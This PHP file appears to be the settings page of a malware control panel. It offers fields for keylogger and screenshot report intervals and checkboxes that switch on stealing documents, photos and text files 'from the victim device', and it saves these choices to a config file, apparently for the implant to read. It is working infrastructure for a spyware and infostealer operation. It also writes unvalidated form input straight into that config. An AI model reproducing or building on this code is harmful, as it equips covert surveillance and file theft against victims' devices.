<?php include('header.php'); ?>

<?php




    $loc = json_decode(file_get_contents('../config.json'), true);
    $time_keylogs = $loc['time_keylogs'];
    $time_screenshot = $loc['time_screenshot'];
    $grab_docs = $loc['grab_docs'];
    $grab_photos = $loc['grab_photos'];	
    $grab_txt = $loc['grab_txt'];
     
  

    echo '</div><div class="row">
    <div class="col-md-12">
    <div class="panel-default" style="background-image: linear-gradient(to bottom,#232323 0,#232323 100%);">
    <div class="panel-heading">
    <h3 class="panel-title">Setitngs</h3>
  </div>
     <div class="panel-body table-bordered" style=" padding-left:40px;padding-right:40px;padding-bottom:25px;padding-top:25px;">
     <div class="alert alert-info text-left" style="font-size:18px" role="alert"> These settings are important for sending screenshots and keylogger reports. You can set a convenient time for you. You can also activate the file stealing a feature from the victim device  </div>
     <form method="POST" class="form-group" >
    
                     <div class="form-group col-md-12" style="margin-top:10px;margin-bottom: 20px;padding-bottom: 10px;padding-top: 10px;">
                       <label style="padding-right: 15px;padding-bottom: 10px;padding-top: 10px;"> Time keylogger </label>
                       <input name="time_keylogs" type="number" style="background-color: #000;color: #fff;" class="form-control" value="'.$time_keylogs.'" placeholder="">
                       <label style="padding-right: 15px;padding-bottom: 10px;padding-top: 10px;"> Time screenshot </label>
                       <input name="time_screenshot" style="background-color: #000;color: #fff;" type="number" class="form-control" value="'.$time_screenshot.'" placeholder="">

                     </div>';


                     echo '<div class="form-group" style="font-size: larger;margin-top:10px;padding-left: 15px;padding-right: 15px;margin-right: 10px;/*! margin-left: 10px; */">';

                     if ($grab_docs == 1){
                        echo '<input  style="margin-left: 15px;margin-right: 15px;padding-right: 15px;padding-left: 15px;" name="grab_docs" checked type="checkbox" > Stealer Docs';
                    }else{
                        echo '<input  style="margin-left: 15px;margin-right: 15px;padding-right: 15px;padding-left: 15px;" name="grab_docs"  type="checkbox" > Stealer Docs';
                    }
                    
                    if ($grab_photos == 1){
                        echo '<input style="margin-left: 15px;margin-right: 15px;padding-right: 15px;padding-left: 15px;" name="grab_photos"  checked type="checkbox" > Stealer Photos';
                    }else{
                        echo '<input style="margin-left: 15px;margin-right: 15px;padding-right: 15px;padding-left: 15px;" name="grab_photos"   type="checkbox" > Stealer Photos';
                    }
                    
                    if ($grab_txt == 1){
                        echo ' <input  style="margin-left: 15px;margin-right: 15px;padding-right: 15px;padding-left: 15px;" name="grab_txt"  checked type="checkbox" >Stealer TXT';
                    }else{
                        echo ' <input  style="margin-left: 15px;margin-right: 15px;padding-right: 15px;padding-left: 15px;" name="grab_txt"   type="checkbox" >Stealer TXT';
                    }

                    
                    if(isset($_POST['submit'])){
                        if (@$_POST['grab_docs'] == "on"){
                            
                           $s_d = 1;  
                        }else{
                          
                            $s_d = 0;  
                        }

                        if (@$_POST['grab_photos'] == "on"){
                      
                            $s_p = 1;
                        }else{
                        
                            $s_p = 0;
                        }
                        if (@$_POST['grab_txt'] == "on"){
                          
                            $s_t = 1;
                        }else{
                            
                            $s_t = 0;
                        }


                        $handle = '{"time_keylogs": '.$_POST['time_keylogs'].', "time_screenshot": '.$_POST['time_screenshot'].' , "grab_docs": '.$s_d.'  , "grab_photos": '.$s_p.', "grab_txt": '.$s_t.' }';
                        $f = fopen("../config.json", "w");
                        fwrite($f, $handle); 
                        fclose($f);
                      
                        echo '<div style="margin-top:10px;" class="text-center alert alert-success" role="alert">Saved successfully </div>';  
                        echo '<meta http-equiv="refresh" content="5;url=settings.php" />';  											

                      
    
                    }

                 echo '</div>
                            <br />
                                    <button name="submit" type="submit" class="btn-save"> Save  <span class="ion-android-done"></span></button>
                                    <button type="reset" class="btn-close"> Reset  <span class="ion-android-delete"></span></button>
                                </form>  
                                <br />
                    </div>	
                </div>
                </div>
            </div>';








?>




<?php include('footer.php'); ?>